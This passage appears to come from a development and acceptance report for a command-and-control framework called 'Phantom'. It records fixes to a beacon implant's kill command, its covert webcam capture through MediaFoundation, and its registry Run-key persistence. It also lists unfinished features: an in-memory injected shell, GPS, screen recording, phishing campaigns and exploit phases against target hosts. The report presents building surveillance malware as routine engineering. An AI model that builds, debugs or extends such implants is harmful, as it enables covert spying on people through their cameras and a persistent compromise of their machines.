`%TEMP%\phantom_cam_trace.log` writer to nothing unless the build sets
`-DPHANTOM_CAM_TRACE=1`. The trace file used during the acceptance run was
read (quoted below), then deleted.

## 5. The kill bug — three defects in series

Symptom: `kill` was delivered (server log: `delivering 1 task(s): kill`), the
UI kept the beacon `ACTIVE`, the task stayed queued and was redelivered on
every check-in, and the process never died. Each fix exposed the next defect.

### 5.1 Defect 1 — greedy hex escape in the exit sentinel

`phantom/payloads/beacon/src/main.cpp`, `dispatch_command`:

```cpp
return "\x01\x02EX";        // wrong
```

A C++ `\x` escape consumes **as many hex digits as follow**. `E` is a hex
digit, so `\x02E` is the single character `0x2E` (`.`), and the literal is
three bytes: `01 2E 58` — never `01 02 45 58`. The task loop checked
`output[0] == '\x01' && output[1] == '\x02'`, which can never be true for
that literal. The beacon trace proved the length (the trace's byte dump only
prints for four or more bytes, so the three bytes are established by the
escape analysis, not by the dump):

```
loop:task cmd=kill outlen=3
```

Fix — split the adjacent literals so the escape cannot swallow `E`:

```cpp
return "\x01\x02" "EX";
```

After the fix the same trace reads:

```
loop:task cmd=kill outlen=4 b=1,2,69,88
loop:EXIT-SENTINEL
```

### 5.2 Defect 2 — raw control bytes made the result JSON invalid

With the sentinel finally matching, `net::send_result` sent the 4 raw bytes
inside a JSON string. `json.loads` on the server rejects literal control
characters:

```
Failed to parse result JSON from B-F7C9…: Body: {"task_id":"…","output":".X"}…
Invalid control character at: line 1 column 54
```

The parse error meant **no ack**: the task was never removed from the queue
and every check-in redelivered it. `network.h` now escapes `0x01..0x1F` as
`\u00XX` (and `\b`/`\f`), so the body is valid JSON regardless of payload.

### 5.3 Defect 3 — a resumed beacon stayed `EXITED`

`c2_server.py` `update_beacon` kept `status="exited"` when the same beacon
checked in again (persistence relaunch, fresh dropper run, same build
replaying). The check-in itself proves the process is alive; the UI showed a
task-serving beacon as dead. Fixed by clearing `status`/`exited_at` on
check-in. Verified after an A10 restart: `B-EBDC…` came back **ACTIVE**, then
`EXITED` again after the acceptance kill.

### 5.4 Acceptance chain (real dropper, not repro)


## 6. Camera capture

### 6.1 Root causes fixed in the MediaFoundation path

The capture failed for six independent reasons, all confirmed against the
Windows SDK headers and a byte-search of the system MF DLLs:

1. wrong `IMFMediaSource` / `IMFSourceReader` IIDs;
2. `SetCurrentMediaType` called with the wrong arity (the vtable slot takes
   four arguments; index `0x07` verified correct);
3. `MF_VIDEO_PROCESSOR_ALGORITHM` attribute set on the wrong object
   (`MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING` belongs on the reader
   attributes);
4. `MF_MT_FRAME_SIZE` written as two `UINT32`s instead of one packed
   `UINT64`;
5. the native media type was consumed without cloning + `CopyAllItems`;
6. the reader delivers **NV12** even when RGB32 is requested (the `settype`
   call returns success but the samples stay NV12), so RGB32-only code read
   garbage. A BT.601 NV12→RGB conversion was added in-code.

### 6.2 Accept strategy

The first frame after `SetCurrentMediaType` is not usable (AGC convergence):
it is typically black. The capture now accepts the **first frame whose mean
luminance is in `[20, 235]`**, and falls back to the frame closest to 128
after 90 attempts. Both the RGB32 and the NV12 branches use it. The trace
marker is `grab:accept mid`.

### 6.3 Evidence

Debug repro (bright room), used only to prove the pipeline and the image:

- mean luminance **223.5**, visually confirmed real scene
- trace: `grab:lum attempt=…`, `grab:accept mid`, `grab:done ok=1`

Real dropper (ambient light low), acceptance run:

```
grab:read no-sample
grab:read sample ok
grab:fmt nv12
grab:lum attempt=1 lum=14
grab:lum attempt=2 lum=14
grab:lum attempt=3 lum=24
grab:accept mid
grab:done ok=1
```

- `data/screenshots/camera_Integrated Camera.bmp` — **2 764 854 B**,
  1280×720, min 0, max 181, mean **25.2**, stddev 23.7, 181 distinct values
- `camera_dropper_1027.png` — visual proof of the real (dark) room
- task result **3 686 510 B**, delivered through the real C2

The dark frame is environmental, not a capture failure: the mid-accept window
`[20, 235]` accepted luminance 24, which is a real, non-black scene (max 181,
181 distinct levels). A well-lit room produced 223.5 on the repro.

The trace writer is now compiled out (`PHANTOM_CAM_TRACE=0`) and the trace
file was deleted after the evidence above was recorded.

## 7. Persistence and `unpersist`

- The C2 shell's auto-persist used to queue `persist runkey` / `persist
  systemd`. The beacon's `persist` argument is the **artifact name**, not the
  method, so such a run created a Run value literally named `runkey` /
  `systemd`; bare `unpersist` removes `PhantomBeacon` and could never find it.
  Fixed to queue the bare `persist` (the beacon defaults the name to
  `PhantomBeacon`) and to report the method separately.
- `persist` created `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PhantomBeacon`
  and a result of 101 B through the dropper.
- `unpersist` returned 57 B and the RunKey was **ABSENT** immediately after.
- The same absence was verified for `B-F7C9…`, `B-E7DE…`, `B-2E85…`,
  `B-8A7C…` — four independent beacons, not one lucky run.
- Server-side: `c2_server.py` used to label an autopersist request
  `runkey`/`systemd` even when the beacon had never reported an OS. That put a
  false claim in the operator log and the immutable audit chain; it now
  records `unknown` and lets the beacon resolve its native default.

## 13. Known issues (not fixed in this window)

1. **Spawn / `CreateProcessA` crash** — the in-memory injected shell path
   crashes the beacon process. This blocks the WIA camera fallback, `shell`,
   `gps`, `screen_record`, and persistence strategy 2. Documented as a known
   issue; the MF capture path does not depend on it.
2. **No admin** — raw SYN OS fingerprinting cannot run; the parser is tested,
   the probe is not.
3. **Camera in low light** — the mid-accept window accepted a real but dark
   frame (mean 25). The pipeline is correct; the room was dark. A brightness
   hint or a higher floor would help, at the cost of rejecting genuinely dark
   scenes.
4. **Multi-target identity human-wait** — no global bound; a 600 s per-
   capability wait multiplied across retries can exceed an operator's
   patience. Recommend a per-run cap and a visible "waiting for human action"
   line.
5. **AUTO shell lacks `identity_active`** — active identity probes can only be
   enabled from the CLI (`--identity-active`); the shell flag table has no
   entry.
6. **Email transport not configured** — `phish_identity`/`campaign_launch`
   correctly block; email contact is not exercised.
7. **`.18` has no reachable surface** — exploit/payload phases cannot be
   validated against it until the firewall posture changes. No attempt was
   made against any other host.
